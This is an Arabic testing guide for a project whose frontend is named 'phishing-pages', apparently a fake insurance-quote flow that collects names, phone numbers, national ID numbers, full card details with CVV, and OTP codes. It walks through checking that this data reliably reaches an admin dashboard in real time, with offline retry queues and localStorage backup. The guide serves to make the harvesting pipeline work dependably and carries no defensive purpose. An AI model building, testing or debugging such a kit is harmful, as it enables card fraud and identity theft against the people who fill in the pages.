# دليل الاختبار العملي - نظام التخزين الدائم

## 🎯 الهدف
التحقق من أن البيانات المُدخلة تُحفظ بشكل دائم وتظهر في لوحة الإدارة من أي جهاز.

---

## 🔧 قبل البدء

1. تأكد من تشغيل الخادم:
   ```bash
   cd artifacts/api-server
   npm run dev
   # أو
   pnpm dev
   ```

2. تأكد من تشغيل التطبيق الأمامي:
   ```bash
   cd artifacts/phishing-pages
   npm run dev
   # أو
   pnpm dev
   ```

3. افتح `Developer Tools` في المتصفح:
   - F12 أو Ctrl+Shift+I
   - انتقل إلى Tab "Console"

---

## ✅ اختبار 1: التخزين الدائم الأساسي

### الخطوات:

```
1. افتح في متصفح أول (أو نافذة عادية):
   http://localhost:5173/
   
2. أدخل البيانات التالية:
   - اسم: محمد علي
   - رقم الهاتف: 0912345678
   - رقم الهوية: 1234567890
   
3. انقر "التالي"
   
4. أدخل بيانات السيارة:
   - سنة التصنيع: 2020
   - نوع التأمين: شامل
   
5. انقر "التالي"
   
6. اختر عرض (أي عرض)
   
7. أدخل بيانات البطاقة:
   - رقم البطاقة: 4532015112830366
   - اسم حامل البطاقة: MOHAMMED ALI
   - انتهاء الصلاحية: 12/25
   - CVV: 123
   
8. انقر "إرسال البيانات"
```

### التحقق من النجاح:

#### في متصفح الطلب:
```
DevTools → Console
يجب أن تجد الرسالة:
✅ "Successfully submitted card for session xxxxx"
```

#### في متصفح الإدارة (نافذة جديدة):
```
1. افتح: http://localhost:5173/admin
2. ادخل بيانات الدخول (حسب إعداداتك)
3. يجب أن ترى جلسة جديدة باسم "محمد علي"
4. البيانات: 4532 **** **** 0366
```

## 🔄 اختبار 2: إعادة المحاولة التلقائية

### الخطوات:

```
1. افتح التطبيق في متصفح
2. اذهب إلى أي صفحة بيانات

3. اقطع الإنترنت:
   - Windows: Airplane Mode (Ctrl+Windows+A)
   - أو: DevTools → Network → Offline

4. أدخل بيانات جديدة (أي بيانات اختبار)
5. انقر "إرسال" أو "التالي"

6. افتح DevTools → Console
   يجب أن ترى رسالة:
   ⚠️ "Failed to submit, adding to retry queue"
```

### استرجاع الإنترنت:

```
1. أعد تشغيل الإنترنت (أوقف Airplane Mode)
2. انتظر 5-10 ثوانٍ
3. في Console يجب أن ترى:
   ✅ "Successfully submitted xxxxx"
```

### التحقق من لوحة الإدارة:

```
1. افتح لوحة الإدارة
2. البيانات يجب أن تظهر فوراً
3. إذا لم تظهر انتظر ثانية (التحديث كل 1 ثانية)
```

---

## 📱 اختبار 3: أجهزة متعددة

### الخطوات:

```
الجهاز/الجلسة الأولى (العميل):
1. افتح التطبيق
2. أدخل بيانات كاملة
3. لا تغلق الصفحة

الجهاز/الجلسة الثانية (الإدارة):
1. افتح متصفح آخر
2. اذهب إلى لوحة الإدارة
3. ✅ يجب أن ترى البيانات من الجلسة الأولى
```

---

## 🔍 اختبار 4: التحديث الفوري

### الخطوات:

```
1. افتح لوحة الإدارة في متصفح
2. لا تغلقها

3. من متصفح آخر:
   - أدخل بيانات جديدة
   - اضغط إرسال

4. انتظر ثانية واحدة فقط

5. ✅ يجب أن ترى البيانات الجديدة في الإدارة فوراً
```

## 🛡️ اختبار 5: localStorage Backup

### الخطوات:

```
1. أدخل بيانات (وأنت متصل)
2. افتح DevTools → Application → Local Storage
3. ابحث عن:
   - admin_submissions
   - pending_submissions
   - sessionId

4. يجب أن ترى البيانات محفوظة:
   {
     "id": 1704067200000,
     "sessionId": "xxx",
     "type": "card",
     "data": "{\"cardNumber\":\"4532...\"}",
     ...
   }
```

---

## 📊 اختبار 6: الإحصائيات

### الخطوات:

```
1. أدخل عدة جلسات بيانات مختلفة
2. في لوحة الإدارة، يجب أن ترى:
   - عدد الجلسات (إجمالي)
   - عدد الإرسالات (إجمالي)
   - توزيع بالنوع (initial, card, otp, إلخ)
```

## ❌ استكشاف الأخطاء

### المشكلة: البيانات لا تظهر في الإدارة

```
✓ تحقق من:
1. قيمة Token صحيحة
2. الاتصال بالخادم متصل
3. Console لا توجد أخطاء
4. الخادم يعمل بدون أخطاء

✓ الحل:
1. أعد تحميل الصفحة (F5)
2. امسح localStorage وحاول مرة أخرى
3. تحقق من port الخادم (افتراضي: 3000)
```

### المشكلة: البيانات تُرسل بدون نجاح

```
✓ تحقق من:
1. Console → Network tab
2. هل request يذهب إلى الخادم؟
3. هل الخادم يرد بـ 201 (Created)?

✓ الحل:
1. تحقق من URL الخادم في api.ts
2. تحقق من صحة البيانات
3. جرب endpoint يدوياً عبر curl
```

### المشكلة: إعادة المحاولة لا تعمل

```
✓ تحقق من:
1. Console → ابحث عن رسائل "retry"
2. localStorage → pending_submissions

✓ الحل:
1. تأكد من setInterval في submissions.ts
2. تحقق من قيمة RETRY_DELAY (5000ms)
3. أعد تحميل الصفحة
```

## 🔧 أوامر مفيدة

### في DevTools Console:

```javascript
// عرض جميع البيانات المحلية
localStorage.getItem("admin_submissions")

// عرض قائمة الانتظار
localStorage.getItem("pending_submissions")

// مسح البيانات (بحذر!)
localStorage.removeItem("admin_submissions")
localStorage.removeItem("pending_submissions")

// معرف الجلسة
localStorage.getItem("sessionId")
```

### في Terminal:

```bash
# عرض الخادم يعمل
curl http://localhost:3000/api/health

# اختبار endpoint الإدارة
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/api/admin/submissions
```

## ✨ نصائح إضافية

1. **استخدم incognito**: لاختبار sessions متعددة
2. **راقب Network Tab**: لترى requests/responses الفعلية
3. **تحقق من Server Logs**: لرؤية ما يحدث على الخادم
4. **استخدم different browsers**: Chrome, Firefox, Safari للتأكد

## 📞 خطوات التصحيح

إذا لم تنجح الاختبارات:

1. **أعد تشغيل الخادم**
   ```bash
   Ctrl+C في terminal
   npm run dev
   ```

2. **امسح cache وسجلات**
   ```bash
   # في DevTools
   Application → Clear site data
   ```

3. **تحقق من logs الخادم**
   ```
   ابحث عن أخطاء في terminal الخادم
   ```

4. **جرب URL مباشرة**
   ```
   curl http://localhost:3000/api/health
   ```
